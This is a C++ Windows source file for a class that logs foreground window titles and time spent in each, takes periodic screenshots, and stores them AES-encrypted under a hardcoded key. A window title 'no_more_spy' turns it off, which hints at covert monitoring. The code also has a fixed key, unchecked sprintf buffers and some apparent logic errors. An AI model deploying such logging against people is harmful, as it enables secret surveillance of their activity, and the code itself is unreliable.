#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
//----------------------------------------------------------------------------------------------------------------------------------------
#include "LogWriter.h"
//----------------------------------------------------------------------------------------------------------------------------------------
LogWriter::LogWriter()
{
	sBaseFolderName.assign("C:\\tmp\\ScreenCapture\\");
	sMagicWord.assign("no_more_spy - Notepad");
	uint8_t key[] = {0x10, 0x01, 0x02, 0x03,0x04, 0x05, 0x06, 0x07,0x08, 0x09, 0x0a, 0x0b,0x0c, 0x0d, 0x0e, 0x0f,0x10, 0x11, 0x12, 0x13,0x14, 0x15, 0x16, 0x17,0x18, 0x19, 0x1a, 0x1b,0x1c, 0x1d, 0x1e, 0x1f };
	Aes = new AES(sizeof(key), key);//!!! check if destructor needed

	Captions.clear();
	IDs.clear();
	Freqs.clear();
	Sizes.clear();
	sPrevStatsName.assign("");
	InitFolders();
	return;
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::InitFolders()
{
	char szBufer[1024];
	for (size_t i = 1; i <= 31; i++)
	{
		sprintf(szBufer,"%s%02d",sBaseFolderName.c_str(),i);
		CreateDirectory(szBufer,NULL);
	}

}
//----------------------------------------------------------------------------------------------------------------------------------------
int LogWriter::GetCaptureFreq(){return CaptureFreq;}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::GetTheLocalTime(std::string& result)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	char szBufer[1024];
	sprintf(szBufer, "%02d-%02d-%02d-%02d-%02d-%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	result.assign(szBufer);
	return;
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::utf8_decode(const std::string &str, std::wstring& wstrTo)
{
	wstrTo.clear();
	if (str.empty()) return ;
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	wstrTo.reserve(size_needed);
	wstrTo.assign(size_needed, 0x0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return;
}
//-------------------------------------------------------------------------------------------------------------------------
void LogWriter::utf8_encode(const std::wstring &wstr, std::string& strTo)
{
	strTo.clear();
	if (wstr.empty()) return;
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	strTo.reserve(size_needed);
	strTo.assign(size_needed, 0x0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return ;
}
//-------------------------------------------------------------------------------------------------------------------------
void LogWriter::Tick()
{
	TickTime++;
	TickTime = TickTime % (1024 * 1024);
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::ToTime(size_t Ticks, char* szTime)
{
	long TotalInSec = (Ticks*CaptureFreq/(1000));
	int s = TotalInSec % 60;	TotalInSec-= s;
	int m = (TotalInSec % (60*60))/60; TotalInSec-= m*60;
	int h = TotalInSec / (60 * 60);
	sprintf(szTime, "%02dh:%02dm:%02ds", h, m, s);
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::DoScreenshot(CImage* ScreenShot,float scale=1.0)
{
	::SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_SYSTEM_AWARE);
	int screen_width  = GetSystemMetrics(SM_CXSCREEN);
	int screen_height = GetSystemMetrics(SM_CYSCREEN);

	int captured_width  = int(screen_width*scale);
	int captured_height = int(screen_height*scale);


	HDC hScreenDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
	
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, captured_width, captured_height);
	HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);


	SetStretchBltMode(hMemoryDC, COLORONCOLOR);
	StretchBlt(hMemoryDC, 0, 0, captured_width, captured_height, hScreenDC, 0, 0, screen_width, screen_height,SRCCOPY);
	hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);
	ScreenShot->Attach(hBitmap);
}
//----------------------------------------------------------------------------------------------------------------------------------------
int LogWriter::DoIteration()
{
	int res=0;
	std::string sCaption;
	SYSTEMTIME st;

	if (TickTime%Freq_Caption == 0)
	{
		WCHAR wCaption[1024];
		HWND hwnd = GetForegroundWindow();
		GetWindowTextW(hwnd, (LPWSTR)wCaption, 200);
		utf8_encode(wCaption, sCaption);
		UpdateStatistic(sCaption);
	}
	if (TickTime%Freq_WriteToDisk == 0)
	{
		GetLocalTime(&st);
		CleanupFolderIfNeeded(st.wDay);
		StageStatistic(st.wDay);
		StageScreenshots(st.wDay);
	}
	if (sCaption == sMagicWord)res = 1;
	Tick();
	return res;
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::UpdateStatistic(std::string Item)
{
	if ((last_position >= 0) && (last_position<Captions.size()) && (Captions[last_position]==Item))
	{
		Freqs[last_position]++;
		if(SortedModeOn==1)last_position = Subsort(last_position);

		if (Freqs[last_position] >= Minimal_hits && Screenshots[last_position]!= &emptySCreenshot)
		{
			CImage* ScreenShot = new CImage;
			DoScreenshot(ScreenShot,0.25);
			Screenshots[last_position]=ScreenShot;
		}
		return;
	}

	for (size_t i = 0; i<Captions.size(); i++)
	{
		if (Captions[i]== Item)
		{
			Freqs[i]++;
			if (SortedModeOn == 1)last_position = Subsort(i); else last_position = i;
			return;
		}
	}
	
	Captions.push_back(Item);
	IDs.push_back(Captions.size());
	Freqs.push_back(1);
	Sizes.push_back(0);
	last_position = Captions.size();

	CImage* ScreenShot = NULL;
	Screenshots.push_back(ScreenShot);

	
}
//----------------------------------------------------------------------------------------------------------------------------------------
long LogWriter::Subsort(long i)
{
	while ((i>0) && (Freqs[i]>Freqs[i - 1]))
	{
		std::swap(Captions[i], Captions[i - 1]);
		std::swap(Freqs[i], Freqs[i - 1]);
		std::swap(IDs[i], IDs[i - 1]);
		i--;
	}
	return i;
}
//----------------------------------------------------------------------------------------------------------------------------------------
char* LogWriter::GetFullStatistic(size_t &size)
{
	size = 0;
	char szBufer[4096],szTime[1024];

	for (size_t i = 0; i < Captions.size(); i++)
	{
		ToTime(Freqs[i], szTime);
		sprintf(szBufer, "%04d\t%d\t%s\t%s\n", IDs[i],Sizes[i], szTime, Captions[i].c_str());
		size += strlen(szBufer)+1;
	}
	size++;

	if (size % 16 != 0) size += 16 - (size % 16);
	char* result = new char[size];
	memset(result,0, size);
	strcpy(result, "");

	for (size_t i = 0; i < Captions.size(); i++)
	{
		ToTime(Freqs[i], szTime);
		sprintf(szBufer, "%04d\t%d\t%s\t%s\n", IDs[i], Sizes[i], szTime, Captions[i].c_str());
		strcat(result, szBufer);
	}

	return result;
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::CleanupFolderIfNeeded(int DayNumber)
{
	char szFileName[1024];
	sprintf(szFileName, "%s%02d.dat", sBaseFolderName.c_str(), DayNumber);
	if (std::string(szFileName) != sPrevStatsName)
	{
		char szImageFolder[1024];
		sprintf(szImageFolder, "%s%02d\\", sBaseFolderName.c_str(), DayNumber);
		CleanupFolder(szImageFolder);
		sPrevStatsName.assign(szFileName);
		Captions.clear();
		IDs.clear();
		Freqs.clear();
		Sizes.clear();
	}

}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::StageScreenshots(int DayNumber)
{
	for (size_t i = 0; i < Captions.size(); i++)
	{
		char szImageName[1024], szImageEncrypted[1024];
		sprintf(szImageName,      "%s%02d\\%04d.jpg", sBaseFolderName.c_str(), DayNumber, IDs[i]);
		sprintf(szImageEncrypted, "%s%02d\\%04d.dat", sBaseFolderName.c_str(), DayNumber, IDs[i]);
		if ((Screenshots[i] != NULL) && (Screenshots[i]!= &emptySCreenshot))
		{
			Screenshots[i]->Save(szImageName);
			if (EncryptionModeOn == 1)
			{
				size_t size = Aes->EncryptFileOnDisk(szImageName, szImageEncrypted);
				DeleteFileA(szImageName);
				Sizes[i] = size;
			}

			Screenshots[i]->Destroy();
			Screenshots[i] = &emptySCreenshot;
		}
	}
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::StageStatistic(int DayNumber)
{
	char szFileName[1024];
	
	char* szBufer;
	size_t N;
	szBufer = GetFullStatistic(N);


	std::fstream f;
	if (EncryptionModeOn == 0)
	{
		sprintf(szFileName, "%s%02d.txt", sBaseFolderName.c_str(), DayNumber);
		f.open(szFileName, std::ios::out );
		f << szBufer;
		f.close();
	}
	else
	{
		sprintf(szFileName, "%s%02d.dat", sBaseFolderName.c_str(), DayNumber);
		f.open(szFileName, std::ios::out | std::ios::binary);
		uint8_t* szBuferEncrypted = new uint8_t[N];
		int res = Aes->Encrypt(N, (uint8_t*)szBufer, (uint8_t*)szBuferEncrypted);
		for (size_t i=0;i<N;i++)f << szBuferEncrypted[i];
		delete[]szBuferEncrypted;
		f.close();
	}

	delete []szBufer;
	
}
//----------------------------------------------------------------------------------------------------------------------------------------
void LogWriter::CleanupFolder(const char* szFolderName)
{
	std::vector<std::string> names;
	GetFileNames(szFolderName, "*.*", names);
	for (size_t i = 0; i < names.size(); i++)DeleteFileA((std::string(szFolderName)+names[i]).c_str());
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------------
